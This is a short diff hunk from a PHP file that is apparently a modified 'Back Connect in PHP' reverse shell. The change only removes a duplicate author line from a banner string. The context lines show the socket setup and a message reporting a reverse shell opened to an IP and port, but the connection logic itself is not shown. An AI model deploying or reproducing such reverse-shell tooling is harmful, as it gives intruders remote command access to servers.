@@ -108,8 +108,7 @@ stream_set_blocking($sock, 0);
 fputs ($sock , 
             "\n=================================================================\n 
             Back Connect in PHP\n 
-            Modified By: Tarunkant Gupta\n
-            @@author : Tarunkant Gupta  
+            Modified By: Tarunkant Gupta\n  
             \n================================================================="); 
 
 printit("Successfully opened reverse shell to $ip:$port");
